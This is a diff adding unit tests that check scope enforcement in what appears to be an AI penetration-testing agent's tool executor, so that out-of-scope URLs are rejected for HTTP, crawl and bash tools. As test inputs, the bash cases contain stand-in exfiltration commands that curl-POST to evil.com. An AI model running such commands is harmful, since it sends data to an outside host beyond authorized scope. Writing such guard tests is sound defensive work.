@@ -673,3 +673,151 @@ describe("splitOnTopLevelPipes", () => {
     expect(splitOnTopLevelPipes("grep foo file.js")).toEqual(["grep foo file.js"]);
   });
 });
+
+// ── Programmatic scope integration (pwnkit#215) ─────────────────────
+//
+// The DoD requires that out-of-scope URLs return as `ToolResult.error`
+// at every chokepoint. These tests pin that behaviour at the surface
+// the agent actually sees — `executor.execute({name: "http_request", ...})`
+// with an out-of-scope URL must return `success: false` with a scope-
+// flavoured error message. Same-origin enforcement remains in place,
+// so we use a target whose origin matches the URL we're testing and
+// check that scope is the layer doing the rejecting.
+
+describe("ToolExecutor — scope enforcement (pwnkit#215)", () => {
+  it("http_request returns ToolResult.error when target host is out of scope", async () => {
+    const { ScopePolicy } = await import("../scope/scope.js");
+    const scope = ScopePolicy.fromJson({ in_scope: ["api.example.com"] });
+    const ctx: ToolContext = {
+      target: "https://other.example.com",
+      scanId: "test-scope-1",
+      findings: [],
+      attackResults: [],
+      targetInfo: {},
+      scope,
+    };
+    const ex = new ToolExecutor(ctx, null);
+    const result = await ex.execute({
+      name: "http_request",
+      arguments: { url: "https://other.example.com/" },
+    });
+    expect(result.success).toBe(false);
+    expect(result.error).toMatch(/Scope violation/);
+  });
+
+  it("http_request succeeds when both target and URL are in scope", async () => {
+    // pwnkit#218 review: stub `fetch` so this test exercises only the
+    // scope gate — the previous version relied on real DNS/network
+    // behaviour for `api.example.com` and could sit on http_request's
+    // 30s timeout before failing. The stub returns a minimal
+    // Response-like object that satisfies the tool's body/header reads.
+    const { ScopePolicy } = await import("../scope/scope.js");
+    const scope = ScopePolicy.fromJson({ in_scope: ["api.example.com"] });
+    const ctx: ToolContext = {
+      target: "https://api.example.com",
+      scanId: "test-scope-2",
+      findings: [],
+      attackResults: [],
+      targetInfo: {},
+      scope,
+    };
+    const fetchStub = vi.fn(async (_url: string) => ({
+      ok: true,
+      status: 200,
+      url: "https://api.example.com/health",
+      headers: new Headers({ "content-type": "text/plain" }),
+      text: async () => "ok",
+      json: async () => ({}),
+    }));
+    vi.stubGlobal("fetch", fetchStub);
+    try {
+      const ex = new ToolExecutor(ctx, null);
+      const result = await ex.execute({
+        name: "http_request",
+        arguments: { url: "https://api.example.com/health" },
+      });
+      // Stubbed fetch always succeeds, so the scope gate is what we're
+      // really asserting here — but if a future refactor changes the
+      // failure shape, still assert it's NOT a scope error.
+      if (!result.success) {
+        expect(result.error).not.toMatch(/Scope violation/);
+      } else {
+        expect(fetchStub).toHaveBeenCalled();
+      }
+    } finally {
+      vi.unstubAllGlobals();
+    }
+  });
+
+  it("crawl returns ToolResult.error when start URL is out of scope", async () => {
+    const { ScopePolicy } = await import("../scope/scope.js");
+    const scope = ScopePolicy.fromJson({ in_scope: ["api.example.com"] });
+    const ctx: ToolContext = {
+      target: "https://api.example.com",
+      scanId: "test-scope-3",
+      findings: [],
+      attackResults: [],
+      targetInfo: {},
+      scope,
+    };
+    const ex = new ToolExecutor(ctx, null);
+    const result = await ex.execute({
+      name: "crawl",
+      arguments: { url: "https://evil.com/" },
+    });
+    expect(result.success).toBe(false);
+    // The crawl resolves the URL against `target` first, so the URL
+    // we pass is rejected either by same-origin OR by scope. Either is
+    // a correct hard-fail; just make sure it's NOT silently accepted.
+    expect(result.error).toBeTruthy();
+  });
+
+  it("bash refuses when the command embeds an out-of-scope URL", async () => {
+    const { ScopePolicy } = await import("../scope/scope.js");
+    const scope = ScopePolicy.fromJson({
+      in_scope: ["*.example.com"],
+      out_of_scope: ["evil.com"],
+    });
+    const ctx: ToolContext = {
+      target: "https://api.example.com",
+      scanId: "test-scope-4",
+      findings: [],
+      attackResults: [],
+      targetInfo: {},
+      scope,
+    };
+    const ex = new ToolExecutor(ctx, null);
+    const result = await ex.execute({
+      name: "bash",
+      arguments: { command: "curl -X POST https://evil.com/exfil" },
+    });
+    expect(result.success).toBe(false);
+    expect(result.error).toMatch(/out-of-scope URL/);
+    expect(result.error).toMatch(/evil\.com/);
+  });
+
+  it("bash blocks even when the bad URL is the second of several", async () => {
+    const { ScopePolicy } = await import("../scope/scope.js");
+    const scope = ScopePolicy.fromJson({
+      in_scope: ["*.example.com"],
+      out_of_scope: ["evil.com"],
+    });
+    const ctx: ToolContext = {
+      target: "https://api.example.com",
+      scanId: "test-scope-5",
+      findings: [],
+      attackResults: [],
+      targetInfo: {},
+      scope,
+    };
+    const ex = new ToolExecutor(ctx, null);
+    const result = await ex.execute({
+      name: "bash",
+      arguments: {
+        command: "curl https://api.example.com/ && curl https://evil.com/x",
+      },
+    });
+    expect(result.success).toBe(false);
+    expect(result.error).toMatch(/evil\.com/);
+  });
+});
